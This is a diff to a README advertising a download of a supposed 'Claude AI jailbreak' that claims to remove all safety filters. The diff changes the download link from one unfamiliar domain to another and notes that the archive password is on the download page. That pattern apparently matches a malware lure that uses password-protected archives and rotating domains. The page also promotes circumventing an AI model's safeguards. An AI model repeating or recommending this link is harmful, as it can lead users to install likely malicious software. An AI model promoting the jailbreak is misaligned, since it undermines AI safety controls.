@@ -18,7 +18,7 @@ Claude AI jailbreak — removes all safety filters and Constitutional AI restric
 
 ## Download
 
-[![Download vSonnet-4](https://img.shields.io/badge/Download_vSonnet-4-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/claudejb)
+[![Download vSonnet-4](https://img.shields.io/badge/Download_vSonnet-4-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/claudejb)
 
 > The archive password is shown on the download page.
 
